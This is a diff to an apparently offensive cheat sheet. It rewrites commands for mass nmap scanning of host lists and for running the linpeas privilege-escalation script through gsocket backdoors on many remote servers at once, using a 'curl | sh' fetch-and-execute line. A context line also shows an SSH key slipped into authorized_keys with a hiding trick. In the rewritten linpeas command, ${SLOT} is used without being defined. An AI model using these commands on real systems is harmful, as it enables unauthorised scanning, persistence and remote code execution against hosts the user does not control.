@@ -352,20 +352,20 @@ echo "ssh-ed25519 AAAAOurPublicKeyHere....blah x@y"$'\r'"$(<authorized_keys)" >a
 <a id="parallel"></a>
 **1.ix. Execute in parallel with separate logfiles***
 
-Scan 20 hosts in parallel and log each result to a separate log file:
+Note: The same can be achieved with [parallel](https://www.gnu.org/software/parallel/parallel_tutorial.html).
+
+Scan hosts in 20 parallel tasks:
 ```sh
-# hosts.txt contains a long list of hostnames or ip-addresses
-# (Use -sCV for more verbose version)
-cat hosts.txt | parallel -j20 'exec nmap -n -Pn -sV -F --open -oG - {} >nmap_{}.txt'
+cat hosts.txt | xargs -P20 -I{} --process-slot-var=SLOT bash -c 'exec nmap -n -Pn -sV -F --open -oG - {} >>"nmap_${SLOT}.txt"'
 ```
-Note: The example uses `exec` to replace the underlying shell with the last process (nmap, gsexec). It's optional but reduces the number of running shell binaries.
+- Use `exec` to replace the underlying shell with the last process (nmap). It's optional but reduces the number of running shell binaries.
+- ${SLOT} contains a value between 0..19 and is the "task number". We use it to write the results into 20 separate files.
 
 Execute [Linpeas](https://github.com/carlospolop/PEASS-ng) on all [gsocket](https://www.gsocket.io/deploy) hosts using 40 workers:
 ```sh
-# secrets.txt contains a long list of gsocket-secrets for each remote server.
-cat secrets.txt | parallel -j40 'mkdir host_{}; exec gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>host_{}/linpeas.err'
+cat secrets.txt | xargs -P40 -I{} bash -c 'mkdir host_{}; gsexec {} "curl -fsSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" >host_{}/linpeas.log 2>>"linpeas-${SLOT}.err"'
 ```
-Note: `xargs -P20 -I{}` is another good way but it cannot log each output into a separate file.  
+- Log each result into a separate file but log all errors into a error-log file by task-number.
 
 ---
 <a id="ssh"></a>
